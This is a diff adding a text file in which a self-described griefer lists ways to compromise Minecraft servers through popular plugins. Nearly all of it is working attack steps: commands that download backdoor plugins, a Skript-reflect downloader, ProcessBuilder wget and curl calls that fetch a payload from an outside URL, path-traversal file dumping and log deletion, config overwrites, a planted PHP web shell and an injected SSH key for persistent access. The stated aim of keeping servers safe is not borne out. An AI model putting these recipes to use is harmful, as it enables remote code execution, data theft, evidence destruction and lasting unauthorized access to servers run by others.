@@ -1,0 +1,112 @@
+These are all the methods of gaining access to server files that I have mastered over the year of griefing.
+
+I decided to leak this to you so that I can finally leave these dirty deeds behind and so that your servers are safe. Thanks! 
+
+- PlugManX                                                                   
+  Version: (2.3.1-2.3.6)                                                      
+  Command: /plugman download [direct/spigot] [url/id]                                          
+  Example: /plugman download direct [URL to backdoor plugin]                           
+                                                                              
+                                                                              
+ - PluginManager                                                              
+  Version: (ALL)                                                              
+  Command: /pm download [direct/spigot] [url/id]                                                         
+  Example: /pm download direct [URL to backdoor plugin]                              
+                                                                              
+                                                                              
+ - Skript & Skript-reflect                                                    
+  Version: (ALL)                                                              
+  Command: This has no commands!                                                                                                                         
+  Requires: Send messages to chat                                              
+    !import java.io.File                                                      
+    !import java.io.FileOutputStream                                          
+    !import java.io.InputStream                                               
+    !import java.net.URL                                                      
+    !import java.net.HttpURLConnection                                        
+    !import org.apache.commons.io.IOUtils                                     
+                                                                              
+    !set {azdf::BUFFER_SIZE} to 4096                                          
+    !set {azdf::url} to new URL("[URL to backdoor plugin]")            
+    !set {azdf::httpConn} to {azdf::url}.openConnection()                     
+                                                                              
+    !set {azdf::inputStream} to {azdf::httpConn}.getInputStream()             
+    !set {azdf::saveFilePath} to "./plugins/[plugin.jar]"                       
+    !set {azdf::file} to new File({azdf::saveFilePath})                       
+    !{azdf::file}.delete()                                                    
+                                                                              
+    !set {azdf::outputStream} to new FileOutputStream({azdf::saveFilePath})   
+                                                                              
+    !IOUtils.copy({azdf::inputStream}, {azdf::outputStream})                  
+                                                                              
+    !{azdf::outputStream}.close()                                             
+    !{azdf::inputStream}.close()                                              
+                                                                              
+    !delete {azdf::*}                                                         
+           and load plugin with PlugManX/PluginManager or restart                  
+                                                                              
+                                                                              
+ - Javascript Expansion (PlaceholderAPI)                                      
+  Version: (1.6.0-2.1.0)                                                      
+  Command:                                                                    
+   if user /jsexp parse me new java.lang.ProcessBuilder("wget","-P","plugins","[URL to backdoor plugin]") 
+   if container /jsexp parse me new java.lang.ProcessBuilder("curl","-O","plugins/lmao.jar","[URL to backdoor plugin]")         
+           and load plugin with PlugManX/PluginManager or restart                  
+   if command /jsexp not founded, try /papi cmdparse me jsexp OR /jsexpansion
+
+
+ - PlaceholderAPI (Fixed)
+  Version: (ALL)
+  Command: 
+   /papi ecloud download Daddy
+   /papi register Expansion-daddy.jar
+   /daddy ecloud download Javascript 1.6.0
+
+ - DecentHolograms
+  Version: (ALL)
+  Info: Import shitty lines into plugin config = plugin is dead.
+  Command:
+   /dh create gg
+   /dh clone gg ../plugins/LuckPerms/config.yml
+                                                                              
+                                                                              
+ - Multiverse-Core                                                            
+  Version: (ALL)                                                              
+  Command:                                                                    
+    [for dump files]                                                          
+   1) /mvcreate logs/../../test.daT normal                                                  
+   2) /mvim logs/../../ normal                                                     
+   3) /mvclone logs/../../ ../../../../../../var/www/html (need open port 80/443)                       
+                                                                              
+    [for remove logs]                                                         
+   1) /mvcreate logs/.daT normal                                                 
+   2) /mvim logs/ normal                                                         
+   3) /mvdelete logs/                                                            
+                                                                              
+                                                                              
+ - zMenu                                                                      
+  Version: (ALL)
+  Command:                                                                    
+   /zmenu download https://drop.xtrafrancyz.net/selif/wmr3kfm1ui.yml          
+   /papi register ../../zMenu/inventories/downloads/lmao.yml               
+   /papi parse me %rce_LINUX-COMMAND%                                                  
+
+
+ - MyCommand
+  Version: (ALL)
+  Command:
+    [for create a php shell]
+   1) /mycmd-edit autogenerate 45
+   2) /mycmd-edit autogenerated_45 command /lmao
+   3) /mycmd-edit autogenerated_45 type RUN_CONSOLE
+   4) /mycmd-edit autogenerated_45 runcmd add $log$<?php echo shell_exec($_GET['e'e]): ?>
+   5) /mycmd-edit autogenerated_45 log_filename lmao.php
+   6) open the site by digital IP of the server with the name of the created file, example: http://127.0.0.1:80/lmao.php?e=LINUX-COMMAND
+
+    [for create a ssh key]
+   1) /mycmd-edit autogenerate 45
+   2) /mycmd-edit autogenerated_45 command /lmao    
+   3) /mycmd-edit autogenerated_45 type RUN_CONSOLE
+   4.1) On your Windows pc, open PowerShell -> ssh-keygen -t ed25519 -C "lmao" & cat ~/.ssh/id_ed25519.pub
+   4.2) Copy the contents of the file
+   5) /mycmd-edit autogenerated_45 runcmd add $log$%unicode_000A%[contents of the file]
+   6) On your Windows pc, open powershell -> ssh -i ~/.ssh/id_ed25519 user@ip
